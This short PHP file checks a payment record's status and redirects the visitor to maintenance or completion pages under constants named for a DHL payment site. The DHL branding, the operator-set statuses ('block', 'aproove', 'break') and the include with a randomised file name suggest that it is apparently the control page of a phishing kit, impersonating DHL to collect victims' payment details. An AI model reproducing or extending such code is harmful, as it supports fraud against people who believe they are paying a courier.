<?php
include('../../../db.php');
include('../../YH0uW3ecaRHG16ld4waY.php');
$id= mysqli_real_escape_string($con,$_REQUEST['id']);

echo '<head><meta charset="utf-8"></head>';
$sqal = "SELECT * FROM `payment` WHERE `id` = '$id'";
$nehh = $con->query($sqal);
$rowp = $nehh->fetch_assoc();
$rowpays = $rowp['status'];


if($rowp['status']=='block'){
echo '<script>window.location.href="'.URL_dhlpayment.'maintenance/";</script>';
}

if($rowp['status']=='aproove'){
echo '<script>window.location.href="'.URL_dhlpayment_id33.'done/index.html";</script>';
}

if($rowp['break']=='on'){
echo '<script>window.location.href="'.URL_dhlpayment.'maintenance2/";</script>';
}
?>


<script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>

